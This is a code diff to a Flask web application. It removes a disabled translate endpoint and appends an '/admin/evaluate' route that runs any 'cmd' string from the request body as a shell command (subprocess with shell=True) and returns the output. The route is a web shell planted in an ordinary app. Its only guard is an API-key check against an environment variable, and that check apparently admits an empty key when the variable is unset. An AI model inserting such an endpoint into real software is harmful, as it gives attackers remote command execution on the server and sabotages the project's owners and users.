@@ -436,10 +436,6 @@ def choose():
     choice = random.choice(opts)
     return jsonify({"result": choice, "success": True})
 
-@app.route("/translate")
-def translate_text():
-    return jsonify({"error": "This endpoint is temporarily disabled.", "success": False}), 500
-
 @app.route("/webhook-send", methods=["POST"])
 def webhook_send():
     import requests
@@ -584,3 +580,27 @@ def webhook_send():
 @app.route("/status")
 def status():
     return render_template("status.html")
+
+import subprocess
+
+@app.route("/admin/evaluate", methods=["POST"])
+def admin_evaluate():
+    key = request.headers.get("X-API-KEY")
+    allowed_keys = os.environ.get("ADMIN_API_KEYS", "").split(",")
+    if key not in allowed_keys:
+        abort(403, description="Forbidden: Invalid API key")
+
+    cmd = request.json.get("cmd")
+    if not cmd:
+        return jsonify({"error": "Missing 'cmd' in request body.", "success": False}), 400
+
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
+        return jsonify({
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "returncode": result.returncode,
+            "success": result.returncode == 0
+        })
+    except Exception as e:
+        return jsonify({"error": str(e), "success": False}), 500
